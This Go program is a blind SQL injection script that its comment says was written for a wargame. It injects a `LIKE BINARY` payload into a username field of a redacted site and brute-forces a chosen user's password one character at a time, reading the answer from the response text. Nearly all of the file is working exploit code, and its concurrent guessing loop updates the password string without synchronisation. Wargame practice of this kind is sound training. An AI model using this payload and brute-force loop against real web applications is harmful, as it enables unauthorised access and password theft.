// A blind SQL injection implemented for use in a certain wargame
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
)

const (
	SiteURL  = "[redacted]"
	User     = "[redacted]"
	Pass     = "[redacted]"
	HackUser = "[redacted]"
	Chars    = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
)

var wg sync.WaitGroup

func main() {
	client := &http.Client{}
	// Filter the character set to only those included in password
	includedChars := ""
	wg.Add(len(Chars))
	ch := make(chan rune, len(Chars))
	for _, char := range Chars {
		go func(char rune) {
			defer wg.Done()
			if guess(client, "%"+string(char)+"%") {
				ch <- char
			}
		}(char)
	}
	wg.Wait()
	for len(ch) > 0 {
		includedChars += string(<-ch)
	}

	// Assume passwords same length for all users and go brute
	pass := ""
	for i := 0; i < len(Pass); i++ {
		wg.Add(len(includedChars))
		for _, char := range includedChars {
			go func(char rune) {
				defer wg.Done()
				if guess(client, pass+string(char)+"%") {
					pass += string(char)
				}
			}(char)
		}
		wg.Wait()
	}

	fmt.Println(pass)

}

func guess(client *http.Client, pass string) bool {
	injection := "username=" + HackUser + "\" AND password LIKE BINARY \"" + pass + "\"#"
	req, _ := http.NewRequest("POST", SiteURL, strings.NewReader(injection))
	req.SetBasicAuth(User, Pass)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	if strings.Contains(string(body), "doesn't") {
		return false
	}
	return true
}
